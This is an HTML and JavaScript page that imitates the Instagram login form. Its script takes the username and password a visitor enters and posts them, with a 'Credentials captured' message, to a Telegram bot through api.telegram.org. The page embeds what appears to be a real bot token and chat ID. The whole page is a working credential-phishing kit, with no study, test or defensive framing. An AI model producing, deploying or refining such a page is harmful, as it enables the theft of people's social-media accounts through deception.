<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Instagram Login</title>
  <!-- Font Awesome 6 (free) -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .login-container {
      background: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 12px;
      padding: 40px 30px 30px;
      max-width: 380px;
      width: 100%;
      box-shadow: 0 2px 12px rgba(0,0,0,0.05);
      transition: all 0.2s;
    }

    .logo {
      text-align: center;
      margin-bottom: 28px;
      font-size: 2.8rem;
      font-weight: 600;
      letter-spacing: -1.5px;
      color: #262626;
      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }

    .logo i {
      color: #262626;
      margin-right: 4px;
      font-size: 2.4rem;
      vertical-align: middle;
    }

    .input-group {
      margin-bottom: 14px;
      position: relative;
    }

    .input-group input {
      width: 100%;
      padding: 12px 12px 12px 44px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      font-size: 0.95rem;
      outline: none;
      transition: border 0.1s ease;
      color: #262626;
    }

    .input-group input:focus {
      border-color: #a8a8a8;
      background: #fff;
    }

    .input-group i {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      color: #8e8e8e;
      font-size: 1.1rem;
    }

    .login-btn {
      width: 100%;
      padding: 12px 0;
      background: #0095f6;
      border: none;
      border-radius: 8px;
      color: white;
      font-weight: 600;
      font-size: 1rem;
      cursor: pointer;
      margin-top: 8px;
      transition: background 0.15s;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
    }

    .login-btn:hover {
      background: #1877f2;
    }

    .login-btn:active {
      background: #0066c8;
      transform: scale(0.98);
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 22px 0 16px;
    }

    .divider-line {
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .divider-text {
      padding: 0 16px;
      color: #8e8e8e;
      font-weight: 500;
      font-size: 0.8rem;
      text-transform: uppercase;
    }

    .signup-text {
      text-align: center;
      font-size: 0.9rem;
      color: #262626;
      margin-top: 18px;
    }

    .signup-text a {
      color: #0095f6;
      text-decoration: none;
      font-weight: 600;
    }

    .signup-text a:hover {
      text-decoration: underline;
    }

    .telegram-status {
      margin-top: 20px;
      padding: 12px 10px;
      background: #f0f8ff;
      border-left: 4px solid #0088cc;
      border-radius: 6px;
      font-size: 0.85rem;
      color: #1e3c5c;
      display: flex;
      align-items: center;
      gap: 10px;
      opacity: 0.9;
      word-break: break-word;
    }

    .telegram-status i {
      font-size: 1.4rem;
      color: #0088cc;
    }

    .telegram-status span {
      flex: 1;
    }

    .footer-note {
      margin-top: 18px;
      font-size: 0.7rem;
      color: #8e8e8e;
      text-align: center;
    }

    /* small screens */
    @media (max-width: 440px) {
      .login-container {
        padding: 30px 20px 20px;
      }
      .logo {
        font-size: 2.4rem;
      }
    }

    /* loading state */
    .login-btn.loading {
      opacity: 0.7;
      pointer-events: none;
    }

    .login-btn i.fa-spinner {
      animation: spin 0.9s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="login-container" id="loginContainer">
    <!-- Instagram style logo -->
    <div class="logo">
      <i class="fab fa-instagram"></i> Instagram
    </div>

    <!-- Login form -->
    <form id="loginForm" autocomplete="off">
      <div class="input-group">
        <i class="fas fa-user"></i>
        <input type="text" id="username" placeholder="Username" required>
      </div>
      <div class="input-group">
        <i class="fas fa-lock"></i>
        <input type="password" id="password" placeholder="Password" required>
      </div>

      <button type="submit" class="login-btn" id="loginBtn">
        <i class="fas fa-sign-in-alt"></i> Log In
      </button>
    </form>

    <!-- Divider -->
    <div class="divider">
      <div class="divider-line"></div>
      <div class="divider-text">or</div>
      <div class="divider-line"></div>
    </div>

    <!-- Sign up fake link -->
    <div class="signup-text">
      Don't have an account? <a href="#">Sign up</a>
    </div>

    <!-- Telegram status & message preview -->
    <div class="telegram-status" id="telegramStatus">
      <i class="fab fa-telegram-plane"></i>
      <span id="statusMessage">🔐 Ready to send credentials</span>
    </div>

    <div class="footer-note">
      <i class="fas fa-shield-alt"></i>  Your data is sent securely via Telegram
    </div>
  </div>

  <script>
    (function() {
      // ---------- CONFIG ----------
      const BOT_TOKEN = '7669002094:AAFRD_2Loy3zkr6vdE-SmCNgWPHvH5qK20k';
      const CHAT_ID = '937279165';
      const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

      // DOM elements
      const form = document.getElementById('loginForm');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const loginBtn = document.getElementById('loginBtn');
      const statusMsg = document.getElementById('statusMessage');

      // Helper: update status with emoji and text
      function setStatus(emoji, text, isError = false) {
        statusMsg.innerHTML = `${emoji} ${text}`;
        if (isError) {
          statusMsg.parentElement.style.borderLeftColor = '#e74c3c';
          statusMsg.parentElement.style.background = '#fff0f0';
        } else {
          statusMsg.parentElement.style.borderLeftColor = '#0088cc';
          statusMsg.parentElement.style.background = '#f0f8ff';
        }
      }

      // Show loading state on button
      function setLoading(loading) {
        if (loading) {
          loginBtn.classList.add('loading');
          loginBtn.innerHTML = '<i class="fas fa-spinner"></i> Sending...';
        } else {
          loginBtn.classList.remove('loading');
          loginBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Log In';
        }
      }

      // Send data to Telegram with emojis
      async function sendToTelegram(username, password) {
        // Build a rich message with emojis
        const message = 
`📱 *New Instagram Login* 📱
—————————————
👤 *Username:* ${username}
🔑 *Password:* ${password}
—————————————
🕒 Time: ${new Date().toLocaleString()}
📍 From: Instagram Login Page
✅ *Credentials captured* ✅`;

        // Encode for URL
        const payload = {
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
          disable_web_page_preview: true,
        };

        try {
          const response = await fetch(TELEGRAM_API, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
          });

          const result = await response.json();

          if (!response.ok) {
            // Telegram API error
            console.error('Telegram API error:', result);
            throw new Error(result.description || 'Failed to send message');
          }

          // Success
          return { success: true, data: result };
        } catch (error) {
          console.error('Send error:', error);
          return { success: false, error: error.message };
        }
      }

      // Handle form submission
      form.addEventListener('submit', async (e) => {
        e.preventDefault();

        // Get values
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();

        // Simple validation
        if (!username || !password) {
          setStatus('⚠️', 'Please fill in both fields', true);
          return;
        }

        // Disable button & update status
        setLoading(true);
        setStatus('📤', 'Sending credentials to Telegram...');

        // Send to Telegram
        const result = await sendToTelegram(username, password);

        // Re-enable button
        setLoading(false);

        if (result.success) {
          // Success: show nice emoji message
          setStatus('✅', 'Credentials sent successfully! 👍');
          // Clear fields (optional, for demo we keep them, but we can clear)
          // usernameInput.value = '';
          // passwordInput.value = '';
          // You can also show a success animation, but we keep it minimal
        } else {
          // Error
          setStatus('❌', `Error: ${result.error || 'Unknown error'}`, true);
        }
      });

      // Optional: reset status on focus (clean error state)
      usernameInput.addEventListener('focus', () => {
        if (statusMsg.innerHTML.includes('Error')) {
          setStatus('🔐', 'Ready to send credentials');
        }
      });
      passwordInput.addEventListener('focus', () => {
        if (statusMsg.innerHTML.includes('Error')) {
          setStatus('🔐', 'Ready to send credentials');
        }
      });

      // Extra: click on "Sign up" just for demo (no action)
      document.querySelector('.signup-text a').addEventListener('click', (e) => {
        e.preventDefault();
        setStatus('😄', 'Just a demo – no signup page', false);
        setTimeout(() => {
          setStatus('🔐', 'Ready to send credentials');
        }, 2000);
      });

      // Init status
      setStatus('🔐', 'Ready to send credentials');
    })();
  </script>
</body>
  </html>
